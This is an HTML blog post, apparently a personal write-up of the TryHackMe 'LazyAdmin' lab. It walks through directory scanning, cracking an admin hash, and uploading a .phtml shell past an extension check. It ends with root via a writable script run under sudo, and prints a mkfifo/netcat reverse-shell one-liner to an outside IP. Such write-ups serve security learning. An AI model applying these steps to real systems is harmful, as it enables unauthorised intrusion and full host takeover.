@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>[TryHackMe] LazyAdmin - Writeup | ascrivins:blog</title>
+<meta name="keywords" content="Writeup, nmap, dirbuster, ssh, Privilege Escalation, Reverse Shell, Database" />
+<meta name="description" content="A writeup of everything found on LazyAdmin.">
+<meta name="author" content="ascrivins">
+<link rel="canonical" href="https://ascrivins.github.io/posts/tryhackme/lazyadmin/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.bc435bed1061be2618667408894ae8a5d27c970831ce57f287e42f911918fcbc.css" integrity="sha256-vENb7RBhviYYZnQIiUropdJ8lwgxzlfyh&#43;QvkRkY/Lw=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://ascrivins.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://ascrivins.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://ascrivins.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://ascrivins.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://ascrivins.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.82.1" />
+<meta property="og:title" content="[TryHackMe] LazyAdmin - Writeup" />
+<meta property="og:description" content="A writeup of everything found on LazyAdmin." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ascrivins.github.io/posts/tryhackme/lazyadmin/" />
+<meta property="og:image" content="https://ascrivins.github.io/post_images/lazyadmin/banner.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-25T15:54:08&#43;01:00" />
+<meta property="article:modified_time" content="2021-04-25T15:54:08&#43;01:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://ascrivins.github.io/post_images/lazyadmin/banner.png" />
+<meta name="twitter:title" content="[TryHackMe] LazyAdmin - Writeup"/>
+<meta name="twitter:description" content="A writeup of everything found on LazyAdmin."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://ascrivins.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe",
+      "item": "https://ascrivins.github.io/posts/tryhackme/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "[TryHackMe] LazyAdmin - Writeup",
+      "item": "https://ascrivins.github.io/posts/tryhackme/lazyadmin/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[TryHackMe] LazyAdmin - Writeup",
+  "name": "[TryHackMe] LazyAdmin - Writeup",
+  "description": "A writeup of everything found on LazyAdmin.",
+  "keywords": [
+    "Writeup", "nmap", "dirbuster", "ssh", "Privilege Escalation", "Reverse Shell", "Database"
+  ],
+  "articleBody": "Intro Writeup of everything found and exploited in Lazy Admin.\nThe room information says: “Have some fun! There might be multiple ways to get user access.” So this is a writeup of everything I discovered.\nLink to room: https://tryhackme.com/room/lazyadmin\n Reconnaissance Scanning An nmap scan of the IP revealed the following information:\n└─$ nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:51 BST Nmap scan report for [ip] Host is up (0.036s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  SSH port on 22 and a HTTP server on 80. -Standard stuff.\n Dirbuster The HTTP server on 80 gives the default Apache2 page:\nRunning a first round of dirbuster on this server gives the /content/ directory:\nThis gives a webpage for “SweetRice”:\nRunning a second round of dirbuster on this /content/ directory gives up some interesting pages to look at:\n First Credentials Found This dirbuster result gives an old SQL server file that we can download:\nTaking a look at the file, we find a username and an encrypted password:\nDropping this password into hashes.com allows us to easily decrypt:\n42f749ade7f9e195bf475f37a44cafcb:[Redacted]:MD5PLAIN   Webpage Admin Area The other interesting dirbuster result is /content/as/, this gives the login for the admin area.\nWe can login with the credentials found in the SQL database file and have a look around.\nOne interesting thing found here is this:\nThis tell us there is a database running mysql attached to the server on localhost and gives us the credentials, this might come in handy once the server has been compromised.\n Exploitation Shell Upload In the media centre we get an area we can upload files. There is some file extension checking here but we can get past with a .phtml file.\nWith a netcat port listening, we can simply click on the file and perform the exploit.\n└─$ nc -lvnp 1234 listening on [any] 1234 ... connect to [my-ip] from (UNKNOWN) [ip] 59624 Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux 17:16:39 up 26 min, 0 users, load average: 0.00, 0.02, 0.25 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $  We should first upgrade the shell using python:\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")' www-data@THM-Chal:/$   User Flag The user flag is then in the home directory of username: itguy\nwww-data@THM-Chal:/$ cd /home www-data@THM-Chal:/home$ ls itguy www-data@THM-Chal:/home$ cd itguy www-data@THM-Chal:/home/itguy$ ls Desktop Downloads Pictures Templates backup.pl mysql_login.txt Documents Music Public Videos examples.desktop user.txt   Internal Reconnaissance Database The database credentials are listed again within mysql_login.txt in itguy’s home directory. So my first though was to check this database for anything useful.\nwww-data@THM-Chal:/home/itguy$ mysql -u rice -p mysql -u rice -p Enter password: randompass Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 20 Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu) Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql show Databases; show Databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | website | +--------------------+ 5 rows in set (0.00 sec)  From looking around, there is nothing interesting here so this was a dead end.\n Sudo -l Checking the sudo privileges of www-data, we can see the commands that could be leveraged through privilege escalation:\nwww-data@THM-Chal:/home/itguy$ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl  This tells us we can run perl and a script within itguy’s home directory called backup.pl.\n Privilege Escalation backup.pl and copy.sh The backup script is going to run a file called copy.sh in the /etc/ folder:\nwww-data@THM-Chal:/home/itguy$ cat backup.pl #!/usr/bin/perl system(\"sh\", \"/etc/copy.sh\");  The permissions on this file mean we cannot edit but we can edit copy.sh:\nwww-data@THM-Chal:/home/itguy$ ls -al /etc | grep \"copy.sh\" -rw-r--rwx 1 root root 81 Nov 29 2019 copy.sh   Root Reverse Shell The contents of copy.sh gives us a reverse shell that just need updating with our IP and port.\nwww-data@THM-Chal:/home/itguy$ cat /etc/copy.sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc 192.168.0.190 5554 /tmp/f   Root Shell More simply we can just edit copy.sh to gives us a root shell like so:\nwww-data@THM-Chal:/home/itguy$ echo '/bin/sh -i'  /etc/copy.sh www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl # whoami root # python -c 'import pty; pty.spawn(\"/bin/bash\")' root@THM-Chal:/home/itguy#  From here, we can read out the contents of the root flag.\nroot@THM-Chal:/# cd /root root@THM-Chal:~# ls root.txt root@THM-Chal:~# cat root.txt THM{6637f[Redacted]24699f}   Extra Notes Brute Forcing SSH Once I knew the username itguy, I did attempt to brute force his SSH password using hydra and rockyou.txt. However, this did not yield any results.\n ",
+  "wordCount" : "861",
+  "inLanguage": "en",
+  "image":"https://ascrivins.github.io/post_images/lazyadmin/banner.png","datePublished": "2021-04-25T15:54:08+01:00",
+  "dateModified": "2021-04-25T15:54:08+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "ascrivins"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://ascrivins.github.io/posts/tryhackme/lazyadmin/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ascrivins:blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://ascrivins.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+<noscript>
+    <style type="text/css">
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: #1d1e20;
+                --entry: #2e2e33;
+                --primary: rgba(255, 255, 255, 0.84);
+                --secondary: rgba(255, 255, 255, 0.56);
+                --tertiary: rgba(255, 255, 255, 0.16);
+                --content: rgba(255, 255, 255, 0.74);
+                --hljs-bg: #2e2e33;
+                --code-bg: #37383e;
+                --border: #333;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<header class="header" style="border-bottom-style: solid; border-bottom-color: #56773d;">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://ascrivins.github.io/" accesskey="h" title="ascrivins:blog (Alt + H)">ascrivins:blog</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://ascrivins.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://ascrivins.github.io/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://ascrivins.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://ascrivins.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://ascrivins.github.io/posts/">Posts</a>&nbsp;»&nbsp;<a href="https://ascrivins.github.io/posts/tryhackme/">TryHackMe</a></div>
+    <h1 class="post-title">
+      [TryHackMe] LazyAdmin - Writeup
+    </h1>
+    <div class="post-description">
+      A writeup of everything found on LazyAdmin.
+    </div>
+    <div class="post-meta">April 25, 2021&nbsp;·&nbsp;5 min&nbsp;·&nbsp;ascrivins
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://ascrivins.github.io/post_images/lazyadmin/banner.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <div class="details">Table of Contents</div>
+        </summary>
+        <div class="inner"><ul>
+                <li>
+                    <a href="#intro" aria-label="Intro">Intro</a></li>
+                <li>
+                    <a href="#reconnaissance" aria-label="Reconnaissance">Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#scanning" aria-label="Scanning">Scanning</a></li>
+                <li>
+                    <a href="#dirbuster" aria-label="Dirbuster">Dirbuster</a></li>
+                <li>
+                    <a href="#first-credentials-found" aria-label="First Credentials Found">First Credentials Found</a></li>
+                <li>
+                    <a href="#webpage-admin-area" aria-label="Webpage Admin Area">Webpage Admin Area</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#shell-upload" aria-label="Shell Upload">Shell Upload</a></li>
+                <li>
+                    <a href="#user-flag" aria-label="User Flag">User Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#internal-reconnaissance" aria-label="Internal Reconnaissance">Internal Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#database" aria-label="Database">Database</a></li>
+                <li>
+                    <a href="#sudo--l" aria-label="Sudo -l">Sudo -l</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
+                        
+                <li>
+                    <a href="#backuppl-and-copysh" aria-label="backup.pl and copy.sh">backup.pl and copy.sh</a></li>
+                <li>
+                    <a href="#root-reverse-shell" aria-label="Root Reverse Shell">Root Reverse Shell</a></li>
+                <li>
+                    <a href="#root-shell" aria-label="Root Shell">Root Shell</a></li></ul>
+                </li>
+                <li>
+                    <a href="#extra-notes" aria-label="Extra Notes">Extra Notes</a><ul>
+                        
+                <li>
+                    <a href="#brute-forcing-ssh" aria-label="Brute Forcing SSH">Brute Forcing SSH</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h1>
+<p>Writeup of everything found and exploited in Lazy Admin.</p>
+<p>The room information says: &ldquo;Have some fun! There might be multiple ways to get user access.&rdquo; So this is a writeup of everything I discovered.</p>
+<p>Link to room: <a href="https://tryhackme.com/room/lazyadmin">https://tryhackme.com/room/lazyadmin</a></p>
+<hr>
+<h1 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h1>
+<h2 id="scanning">Scanning<a hidden class="anchor" aria-hidden="true" href="#scanning">#</a></h2>
+<p>An nmap scan of the IP revealed the following information:</p>
+<pre><code>└─$ nmap -sC -sV [ip]   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:51 BST
+Nmap scan report for [ip]
+Host is up (0.036s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>SSH port on 22 and a HTTP server on 80. -Standard stuff.</p>
+<hr>
+<h2 id="dirbuster">Dirbuster<a hidden class="anchor" aria-hidden="true" href="#dirbuster">#</a></h2>
+<p>The HTTP server on 80 gives the default Apache2 page:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/apache2.png" alt="Default Apache2 webpage"  />
+</p>
+<p>Running a first round of dirbuster on this server gives the /content/ directory:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/dirbuster1.png" alt="Dirbuster Round 1"  />
+</p>
+<p>This gives a webpage for &ldquo;SweetRice&rdquo;:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/rice-homepage.png" alt="SweetRice webpage"  />
+</p>
+<p>Running a second round of dirbuster on this /content/ directory gives up some interesting pages to look at:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/dirbuster2.png" alt="Dirbuster Round 2"  />
+</p>
+<hr>
+<h2 id="first-credentials-found">First Credentials Found<a hidden class="anchor" aria-hidden="true" href="#first-credentials-found">#</a></h2>
+<p>This dirbuster result gives an old SQL server file that we can download:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/old-sql-found.png" alt="old sql file"  />
+</p>
+<p>Taking a look at the file, we find a username and an encrypted password:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/cred-found.png" alt="Username and Encrypted Password"  />
+</p>
+<p>Dropping this password into hashes.com allows us to easily decrypt:</p>
+<pre><code>42f749ade7f9e195bf475f37a44cafcb:[Redacted]:MD5PLAIN
+</code></pre>
+<hr>
+<h2 id="webpage-admin-area">Webpage Admin Area<a hidden class="anchor" aria-hidden="true" href="#webpage-admin-area">#</a></h2>
+<p>The other interesting dirbuster result is /content/as/, this gives the login for the admin area.</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/admin-login.png" alt="Admin Logon"  />
+</p>
+<p>We can login with the credentials found in the SQL database file and have a look around.</p>
+<p>One interesting thing found here is this:</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/database-credentials.png" alt="Database Credentials"  />
+</p>
+<p>This tell us there is a database running mysql attached to the server on localhost and gives us the credentials, this might come in handy once the server has been compromised.</p>
+<hr>
+<h1 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h1>
+<h2 id="shell-upload">Shell Upload<a hidden class="anchor" aria-hidden="true" href="#shell-upload">#</a></h2>
+<p>In the media centre we get an area we can upload files. There is some file extension checking here but we can get past with a .phtml file.</p>
+<p><img loading="lazy" src="/post_images/lazyadmin/shell-upload.png" alt="Shell Upload"  />
+</p>
+<p>With a netcat port listening, we can simply click on the file and perform the exploit.</p>
+<pre><code>└─$ nc -lvnp 1234               
+listening on [any] 1234 ...
+connect to [my-ip] from (UNKNOWN) [ip] 59624
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 17:16:39 up 26 min,  0 users,  load average: 0.00, 0.02, 0.25
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+<p>We should first upgrade the shell using python:</p>
+<pre><code>$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+www-data@THM-Chal:/$ 
+</code></pre>
+<hr>
+<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
+<p>The user flag is then in the home directory of username: itguy</p>
+<pre><code>www-data@THM-Chal:/$ cd /home
+www-data@THM-Chal:/home$ ls
+itguy
+www-data@THM-Chal:/home$ cd itguy
+www-data@THM-Chal:/home/itguy$ ls
+Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
+Documents  Music      Public    Videos     examples.desktop  user.txt
+</code></pre>
+<hr>
+<h1 id="internal-reconnaissance">Internal Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#internal-reconnaissance">#</a></h1>
+<h2 id="database">Database<a hidden class="anchor" aria-hidden="true" href="#database">#</a></h2>
+<p>The database credentials are listed again within mysql_login.txt in itguy&rsquo;s home directory. So my first though was to check this database for anything useful.</p>
+<pre><code>www-data@THM-Chal:/home/itguy$ mysql -u rice -p
+mysql -u rice -p
+Enter password: randompass
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 20
+Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show Databases;
+show Databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| website            |
++--------------------+
+5 rows in set (0.00 sec)
+</code></pre>
+<p>From looking around, there is nothing interesting here so this was a dead end.</p>
+<hr>
+<h2 id="sudo--l">Sudo -l<a hidden class="anchor" aria-hidden="true" href="#sudo--l">#</a></h2>
+<p>Checking the sudo privileges of www-data, we can see the commands that could be leveraged through privilege escalation:</p>
+<pre><code>www-data@THM-Chal:/home/itguy$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+</code></pre>
+<p>This tells us we can run perl and a script within itguy&rsquo;s home directory called backup.pl.</p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
+<h2 id="backuppl-and-copysh">backup.pl and copy.sh<a hidden class="anchor" aria-hidden="true" href="#backuppl-and-copysh">#</a></h2>
+<p>The backup script is going to run a file called copy.sh in the /etc/ folder:</p>
+<pre><code>www-data@THM-Chal:/home/itguy$ cat backup.pl
+
+    #!/usr/bin/perl
+    
+    system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);
+</code></pre>
+<p>The permissions on this file mean we cannot edit but we can edit copy.sh:</p>
+<pre><code>www-data@THM-Chal:/home/itguy$ ls -al /etc | grep &quot;copy.sh&quot;
+-rw-r--rwx   1 root root      81 Nov 29  2019 copy.sh
+</code></pre>
+<hr>
+<h2 id="root-reverse-shell">Root Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#root-reverse-shell">#</a></h2>
+<p>The contents of copy.sh gives us a reverse shell that just need updating with our IP and port.</p>
+<pre><code>www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f
+</code></pre>
+<hr>
+<h2 id="root-shell">Root Shell<a hidden class="anchor" aria-hidden="true" href="#root-shell">#</a></h2>
+<p>More simply we can just edit copy.sh to gives us a root shell like so:</p>
+<pre><code>www-data@THM-Chal:/home/itguy$ echo '/bin/sh -i' &gt; /etc/copy.sh
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+# whoami
+root
+# python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+root@THM-Chal:/home/itguy# 
+</code></pre>
+<p>From here, we can read out the contents of the root flag.</p>
+<pre><code>root@THM-Chal:/# cd /root
+root@THM-Chal:~# ls
+root.txt
+root@THM-Chal:~# cat root.txt
+THM{6637f[Redacted]24699f}
+</code></pre>
+<hr>
+<h1 id="extra-notes">Extra Notes<a hidden class="anchor" aria-hidden="true" href="#extra-notes">#</a></h1>
+<h2 id="brute-forcing-ssh">Brute Forcing SSH<a hidden class="anchor" aria-hidden="true" href="#brute-forcing-ssh">#</a></h2>
+<p>Once I knew the username itguy, I did attempt to brute force his SSH password using hydra and rockyou.txt. However, this did not yield any results.</p>
+<hr>
+
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://ascrivins.github.io/tags/writeup/">Writeup</a></li>
+      <li><a href="https://ascrivins.github.io/tags/nmap/">nmap</a></li>
+      <li><a href="https://ascrivins.github.io/tags/dirbuster/">dirbuster</a></li>
+      <li><a href="https://ascrivins.github.io/tags/ssh/">ssh</a></li>
+      <li><a href="https://ascrivins.github.io/tags/privilege-escalation/">Privilege Escalation</a></li>
+      <li><a href="https://ascrivins.github.io/tags/reverse-shell/">Reverse Shell</a></li>
+      <li><a href="https://ascrivins.github.io/tags/database/">Database</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://ascrivins.github.io/posts/tryhackme/inclusion/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>[TryHackMe] Inclusion - Walkthrough</span>
+  </a>
+  <a class="next" href="https://ascrivins.github.io/posts/tryhackme/wgel_ctf/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>[TryHackMe] Wgel CTF - Walkthrough</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    <footer class="footer">
+    <span>&copy; 2021 <a href="https://ascrivins.github.io/">ascrivins:blog</a></span>
+    <span>&middot;</span>
+    <span>🇬🇧</span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
